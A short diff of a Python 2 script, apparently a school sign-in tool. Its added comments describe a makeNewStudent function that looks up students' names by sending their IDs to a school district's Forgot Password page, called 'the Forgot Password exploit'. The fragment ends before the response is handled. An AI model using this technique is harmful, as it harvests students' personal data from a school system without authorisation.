@@ -64,6 +64,10 @@ def logOut(student):
     #Return the number of minutes
     return minutesWorked
 
+
+#This method will allow all PAUSD students to be recognized.
+#It obtains the student's name by making use of the Forgot Password exploit.
+#OH PAUSD...
 def makeNewStudent(ID):
     try:
         html = urllib2.urlopen(urllib2.Request("https://palo-alto.edu/Forgot/Reset.cfm",urllib2.urlencode({"username":str(ID)})))
